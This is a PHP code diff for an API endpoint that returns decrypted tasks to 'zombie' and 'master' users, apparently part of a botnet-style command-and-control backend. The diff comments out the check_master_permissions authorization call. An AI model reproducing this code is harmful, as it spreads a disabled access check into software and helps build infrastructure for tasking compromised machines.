@@ -19,7 +19,8 @@ include_once 'config/database.php';
 include_once 'objects/task.php';
 
 // auxilar functions
-include_once 'aux_functions/check_permission.php';
+include_once 'util/check_permission.php';
+include_once 'util/crypt.php';
  
 // get posted data
 $data = json_decode(file_get_contents("php://input"));
@@ -42,28 +43,38 @@ if($jwt){
         
         // check who request and permissions
         $requested_by = $decoded->data->username;
+
         if (is_zombie($db, $requested_by)){
-            $by_zombie_username =  $requested_by;
+            $by_master_username =  $requested_by;
             $by_submit_at_bef =  "";
             $by_submit_at_aft = "";
             $zombie_view = True;
         }
+        
         else{
             $zombie_view = False;
             // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
-            check_master_permissions($requested_by);
+            //check_master_permissions($requested_by);
             // set filters by request (only if requested by master)
-            $by_zombie_username =  (isset($data->zombie_username)) ? $data->zombie_username : "";
-            $by_submit_at_bef =  (isset($data->submit_at_bef)) ? $data->submit_at_bef : "";
-            $by_submit_at_aft =  (isset($data->submit_at_aft)) ? $data->submit_at_aft : "";
-            $by_task_type =  (isset($data->task_type)) ? $data->task_type : "";
+            $by_master_username =  $requested_by;
+            $by_submit_at_bef = (isset($data->submit_at_bef)) ? $data->submit_at_bef : "";
+            $by_submit_at_aft = (isset($data->submit_at_aft)) ? $data->submit_at_aft : "";
+            $by_task_type = (isset($data->task_type)) ? $data->task_type : "";
         }
         
         // instantiate user object
         $task = new Task($db);
         
         // retrieve records
-        $tasks_data = $task->read($by_zombie_username, $by_submit_at_bef, $by_submit_at_aft, $by_task_type, $zombie_view=$zombie_view);
+        $tasks_data = $task->read($by_master_username, $by_submit_at_bef, $by_submit_at_aft, 
+                                  $by_task_type, $zombie_view=$zombie_view);
+
+        
+        for ($i=0; $i < count($tasks_data); $i++) { 
+            $tasks_data[$i]["task_content"] = json_decode(decrypt($tasks_data[$i]["task_content"], $key));
+        }
+            
+
         if($tasks_data){
             
             // set response code
